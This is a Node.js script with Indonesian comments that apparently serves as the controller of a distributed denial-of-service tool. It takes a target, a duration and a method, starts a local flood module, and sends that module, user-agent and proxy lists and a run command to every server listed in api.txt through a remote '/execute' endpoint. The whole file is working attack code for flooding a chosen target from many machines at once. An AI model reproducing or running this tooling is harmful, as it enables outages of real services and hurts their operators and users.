const http = require('http');
const fs = require('fs');
const target = process.argv[2];
const time = process.argv[3];
const tret = 3;
const rps = 13;
const method = process.argv[4];
const asu = require("./index.js")

          asu(target, time, tret, rps, method)
// Membaca file api.txt
fs.readFile('api.txt', 'utf8', (err, apiContent) => {
  if (err) {
    console.error(`Error reading api.txt: ${err}`);
    return;
  }

  // Pisahkan setiap baris dalam api.txt untuk mendapatkan daftar server
  const servers = apiContent.split('\n').filter(line => line.trim() !== '');

  // Membaca ketiga file dari disk
  fs.readFile(`${method}/index.js`, 'utf8', (err, indexContent) => {
    if (err) {
      console.error(`Error reading index.js: ${err}`);
      return;
    }

    fs.readFile('ua.txt', 'utf8', (err, uaContent) => {
      if (err) {
        console.error(`Error reading ua.txt: ${err}`);
        return;
      }

      fs.readFile('proxy.txt', 'utf8', (err, proxyContent) => {
        if (err) {
          console.error(`Error reading proxy.txt: ${err}`);
          return;
        }

        // Data permintaan yang akan dikirim ke setiap server
        const requestData = JSON.stringify({
          indexContent,
          uaContent,
          proxyContent,
          command: `node index.js ${target} ${time} ${tret} ${rps} proxy.txt`
        });

        // Fungsi untuk membuat permintaan ke server tertentu
        const makeRequest = (server) => {
          const [hostname, port] = server.split(':');
          const options = {
            hostname,
            port: parseInt(port),
            path: '/execute',
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            }
          };

          return new Promise((resolve, reject) => {
            const req = http.request(options, (res) => {
              let response = '';

              res.on('data', (chunk) => {
                response += chunk;
              });

              res.on('end', () => {
                console.log(`Response from ${hostname}:${port}:`, response);
                if (res.statusCode >= 400) {
                  console.error(`Error: Received status code ${res.statusCode} from ${hostname}:${port}`);
                  reject(new Error(`Error: Received status code ${res.statusCode} from ${hostname}:${port}`));
                } else {
                  resolve(response);
                }
              });
            });

            req.on('error', (err) => {
              console.error(`Request error to ${hostname}:${port}: ${err}`);
              reject(err);
            });

            req.write(requestData);
            req.end();
          });
        };

        // Menggunakan Promise.all untuk menjalankan permintaan ke semua server secara bersamaan
        Promise.all(servers.map(server => makeRequest(server)))
          .then(responses => {
            console.log('All requests completed successfully:', responses);
          })
          .catch(err => {
            console.error('An error occurred:', err);
          });
      });
    });
  });
});
